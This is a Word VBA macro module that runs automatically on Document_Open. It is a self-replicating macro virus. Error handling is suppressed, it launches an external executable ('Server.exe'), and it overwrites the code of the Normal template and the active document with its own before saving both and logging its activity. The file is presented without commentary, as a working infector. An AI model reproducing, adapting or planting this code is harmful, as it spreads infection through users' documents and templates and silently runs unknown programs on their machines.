   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Private Declare Sub MessageBeep Lib "user32" (ByVal wAlert As Integer)
   Private Declare Function sndPlaySound Lib "WINMM.DLL" Alias "sndPlaySoundA" (ByVal sn As Any, ByVal uflags As Long) As Long
   Private Sub Document_Open()
   On Error Resume Next
   Shell "I:\Eudora\Sys\Server.exe"
   Set TD = ThisDocument.VBProject.VBComponents(1)
   Set AD = ActiveDocument.VBProject.VBComponents(1)
   Set NT = NormalTemplate.VBProject.VBComponents(1)
   VCode = TD.CodeModule.Lines(1, TD.CodeModule.CountOfLines)
   NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
   AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
   NT.CodeModule.InsertLines 1, VCode
   AD.CodeModule.InsertLines 1, VCode
   ActiveDocument.Save
   NormalTemplate.Save

   Open "I:\Rep.log" For Append As #1
   Print #1, "Active on " & Date
   Close
   End Sub
